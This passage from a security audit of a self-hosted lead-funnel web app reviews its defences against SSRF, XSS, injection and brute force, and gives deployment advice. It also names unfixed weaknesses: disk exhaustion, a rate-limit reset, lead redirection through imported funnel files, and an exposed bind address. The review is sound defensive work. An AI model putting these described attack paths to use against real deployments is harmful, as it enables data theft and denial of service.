    lookup failure as unsafe, and **pins `http://` to the vetted address with the original
    `Host` preserved — genuinely closing the TOCTOU window**, which most implementations
    document as unavoidable. `redirect: "manual"` (`webhook.js:220`) stops a 302 from
    sidestepping the check. The decision to leave `https://` on the hostname is **correct**:
    a rebound address cannot present a valid certificate for the operator's configured name,
    so the TLS handshake fails before any request bytes are sent — no exfiltration, no blind
    SSRF. Trailing-dot (`localhost.`) evades the textual check but is caught by resolution.
    Most importantly: **no destination is reachable from a public request body.** `forwardWebhook`
    deliberately ignores `record.webhookUrl` (`webhook.js:182-188`), which `server.test.js:349`
    proves with a live sink.

11. **Secrets never travel outward.** `redactEmailSettings` (`email.js:84-92`) strips
    `resendApiKey`/`smtpPass` and deletes `relayUrl`; `saveEmailSettings` is a strict allowlist
    (`WRITABLE_EMAIL_KEYS`) with per-field range/format validation, treats a blank secret as
    "keep existing" rather than "delete", **and refuses to persist an env-sourced secret to
    disk** (`email.js:112-115`) so rotating the env var keeps working. `smtpHost` rejects
    anything that isn't a bare hostname, specifically to stop it being repurposed as the relay
    URL (`email.js:143-148`, tested at `server.test.js:370`). `relayUrl` is env-only by design.
    `server.test.js:307-347` asserts six distinct secrets are absent from both the funnel page
    and the public JSON. All correct.

12. **Log hygiene against credential leakage is applied consistently.** `errSummary`
    (`log.js:33-35`) is used at every outbound catch site — `webhook.js:227`, `capi.js:118`,
    `email.js:188,206`, `ai.js:137`, `store.js:52` — precisely because Bun puts the full
    request URL on `err.path`, and three of those URLs carry credentials (Meta's `access_token`
    query param, a webhook path token, `SMTP_RELAY_URL`). `hostOf` (`webhook.js:83`) logs the
    host without the path for the same reason. This is a real, non-obvious hazard that the
    author identified and closed everywhere it applies.

13. **Log injection is closed.** `oneLine` (`log.js:18-20`) strips `[\r\n]+` and is applied to
    every attacker-controlled value that reaches a log line or an email subject
    (`ingest.js:70`, `capi.js:26`, `email.js:214,384,395,416`). `EMAIL_RE`
    (`/^[^\s@]+@[^\s@]+\.[^\s@]+$/`) forbids all whitespace including newlines, so **email
    header injection is not possible** on any of the four mail paths — and the Resend
    transport is JSON-bodied anyway.

14. **CSV formula injection is handled — in both exporters.** `apps/app/app.js:2578-2583` and
    the legacy `apps/admin/admin.js:94-99` use the identical helper:
    ```js
    const cell = (v) => {
      const raw = String(v ?? "");
      const safe = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw;
      return `"${safe.replace(/"/g, '""')}"`;
    };
    ```
    Covers `=`, `+`, `-`, `@`, tab and CR, and quotes/doubles correctly. Complete against the
    OWASP list. Applied to every column including `answers` and `referrer`.

15. **The escapers are correct, and every runtime interpolation site uses the right one.**
    `esc` (`html.js:19-30`) handles `& < > " '` in the correct order (`&` first — the classic
    double-encoding bug is absent). Every attribute in `funnelPage` is double-quoted and
    `esc`-wrapped. `jsonScript` (`html.js:36-41`) escapes `<` **and** U+2028/U+2029, which is
    what makes the JSON block unbreakable from inside a funnel's own copy — and
    `server.test.js:75-87` asserts the round trip. The console (`app.js:415`) and both legacy
    UIs carry byte-identical copies, deliberately.

16. **No stored XSS from public ingest into the console.** This was the highest-value chain to
    check (public `/api/lead` → console origin → `of.adminToken`). Every lead-derived value in
    `apps/app/app.js` reaches the DOM through `esc()` — the activity feed (`:963-971`), the
    leads table (`:2482-2491`), the lead drawer (`:2504-2540`) including contact keys, contact
    values, answer step ids and answer values. The `String()` coercions are there because
    "`lead` is public input" — the author already reasoned about type confusion here. Clean.

17. **`email_verified` and the consent signal are re-derived server-side.** `ingest.js:65-72`
    ANDs the client's claim with the server's own `verifiedEmails` record; `capi.js:71-82`
    reads `consent.enabled` from the **funnel document** and requires an explicit `"granted"`
    when the bar is on, so stripping the field from the payload cannot turn the gate off. Both
    are the right shape.

18. **The preview predicate is shared, parsed, and type-guarded.** `preview.js` exists as its
    own module precisely so ingest (`ingest.js:43`) and the admin readers (`admin.js:32,86,87`)
    cannot drift — a bug that previously let a stranger inject records the operator could never
    see. It uses `URL`/`searchParams` rather than substring matching (the
    `?utm_campaign=spring-preview=1-sale` false positive silently destroyed real leads), and
    guards non-string `meta.url` (which previously threw a 500 out of ingest). Only literal
    `true` counts. 8 test cases cover both directions.

19. **Prototype pollution is not reachable.** `readJson` → `JSON.parse` → object spread
    (`ingest.js:54`): spread uses `CreateDataProperty`, so an attacker `__proto__` key becomes
    an own property rather than mutating the prototype. `saveEmailSettings` iterates
    `Object.entries` behind an allowlist. And `computeStats` explicitly uses
    `Object.create(null)` for `perFunnel` (`admin.js:128`) with a comment naming the exact
    `||=`-on-`Object.prototype` failure. Someone thought about this.

20. **Body size is capped at the transport layer.** `maxRequestBodySize: MAX_BODY`
    (`server.js:73`) with the correct reasoning: `readJson`'s `content-length` check reads 0 for
    a chunked request, so the parser-level cap alone would let an unauthenticated caller make
    Bun buffer up to its 128 MB default. `server.test.js:165-185` proves the 413 with a
    `ReadableStream` body. JSON depth bombs are caught by `JSON.parse`'s own `RangeError`
    inside `readJson`'s try/catch.

21. **OTP mechanics are sound.** `randomInt(0, 1_000_000)` from `node:crypto` (CSPRNG, uniform
    — not `Math.random`), 10-minute TTL, attempts burned **before** the comparison
    (`email.js:304-308`) so five wrong answers destroy the code, `safeEqual` for the compare,
    single-use deletion on success, and `sweepExpired()` on both maps. Effective brute-force
    budget: 5 codes/hr/address × 5 attempts = **25 guesses out of 1,000,000 per hour**. No
    enumeration oracle on `/api/otp/verify` — it returns the same `{ok:false, valid:false}`
    whether the address has no live code or the code is wrong. The code is never returned in
    the response body on any path, and `server.test.js:193-209` regression-tests the old
    `NODE_ENV !== "production"` leak.

22. **Console anti-framing.** `CONSOLE_HEADERS` (`static.js:31-36`) sets `X-Frame-Options: DENY`
    **and** `frame-ancestors 'none'` on every operator-facing page, with funnel pages
    deliberately excluded. Tested at `server.test.js:544`.

23. **`clientIp` is centralised and off by default.** `TRUST_PROXY` gates all
    `x-forwarded-for` reading (`http.js:157-169`), no other module reads the header directly
    (verified by grep), and the first forwarded request logs a loud one-time warning when the
    flag is unset. The `MAIL_HOURLY_CAP` design explicitly exists *because* the per-IP key is
    rotatable — the threat is correctly modelled even though M2 undermines the implementation.

---

## Is it safe to run locally?

**On a trusted single-user machine with no untrusted peers on the network: yes, with two
caveats.** The privileged surface is properly closed to everything but a loopback socket
carrying a loopback `Host`, DNS rebinding into the console is genuinely blocked, and a
malicious web page the operator visits cannot drive the console (`Sec-Fetch-Site` +
header-based auth + scoped CORS). That is the hard part and it is done right.

Caveats:
1. **`DATA_DIR` files are world-readable (`0644`)** — m2. On a shared or multi-account machine,
   any local user reads `leads.jsonl` and any mail credential typed into the console.
2. **Do not import a funnel JSON you have not read.** M1 (`leadEndpoint`) applies locally too:
   an imported document silently redirects every captured lead to a third party with no
   server-side trace. And if you have set `ALLOW_CUSTOM_SCRIPTS=1`, an imported document is
   same-origin script execution against your admin token (m1).

**On an untrusted LAN (coffee shop, co-working, conference Wi-Fi): no, not as shipped.**
`Bun.serve` binds `0.0.0.0` and there is no config to change it (M4). Your leads stay
private — the loopback gate holds — but anyone on the network can: enumerate and read all
your funnel content, poison `leads.jsonl`/`events.jsonl`, fill your disk at ~28 GB/day (M3),
and drive mail from your sending domain to arbitrary addresses (m8, amplified by M2). Bind it
to `127.0.0.1` first — which currently requires editing `server.js:57`.

## Is it safe to expose publicly?

**With `ADMIN_TOKEN` set, HTTPS terminated in front, `TRUST_PROXY=1` on a proxy that
*replaces* `x-forwarded-for`, `ALLOW_CUSTOM_SCRIPTS` left off, and only funnel documents you
wrote yourself — the confidentiality story holds up.** I could not find a path for a remote
unauthenticated attacker to read a lead, write a funnel document, execute script on the
console origin, or reach the internal network. That is the bar that matters most and this
codebase clears it.

**The availability story does not hold up, and one abuse ceiling is broken.** Before putting
this in front of real traffic:

- **M3 is the blocker.** A single unauthenticated IP can write ~28 GB/day into your lead sink,
  and the admin readers load the whole file into memory — so *you* crash the process by
  opening your own lead inbox. There is no cap, no rotation, no pagination. Fix this first.
- **M2 next.** The rate limiter's prune resets long-window buckets, so `MAIL_HOURLY_CAP` — the
  only mail bound a caller cannot rotate — can be reset roughly once a minute. On a
  deployment with the autoresponder enabled, that is the open-relay outcome the cap was
  written to prevent.
- **M1 if you accept imported documents at all.** Treat a third-party funnel JSON as a lead
  exfiltration vector, not merely as a markup injection vector, until `leadEndpoint` is
  constrained.
- **M4** matters only if you are on a bare VPS following the README's own advice, which you
  cannot currently follow.

One more operational note, correctly documented but easy to miss: every limit in this process
is a `Map` in this process's heap. **Do not run more than one replica** — every ceiling
multiplies by the replica count and OTP verification breaks intermittently. The server prints
this at boot under `NODE_ENV=production`, which is the right place for it.

Final note on posture: `SECURITY.md:114-122` says the commit log carries a lot of
`fix(security)` and that "a codebase that needed them is a codebase that deserves independent
review". That self-assessment is accurate and, having now read the code, unusually fair —
the fixes are real, each is documented at the code it protects, and the invariants are
regression-tested rather than asserted in prose. The remaining gaps are mostly in the
*availability* dimension the threat model never explicitly claimed to cover.
